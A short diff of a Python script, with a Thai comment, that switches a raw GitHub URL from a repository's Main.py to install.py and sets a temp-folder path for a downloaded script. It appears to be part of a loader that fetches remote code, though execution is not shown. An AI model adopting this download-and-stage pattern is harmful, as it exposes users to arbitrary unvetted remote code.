@@ -27,7 +27,7 @@ import ctypes.util
 # ---------------------------------------------------------------------------------
 
 # เอาลิงก์ Raw URL ของไฟล์หลักที่ 1 บน GitHub มาวางตรงนี้
-GITHUB_RAW_URL = "https://raw.githubusercontent.com/suriwrrnkulchang-art/55/refs/heads/main/Main.py"
+GITHUB_RAW_URL = "https://raw.githubusercontent.com/suriwrrnkulchang-art/55/refs/heads/main/install.py"
 
 temp_dir = tempfile.gettempdir()
 TEMP_FILE = os.path.join(temp_dir, "downloaded_script_1.py")
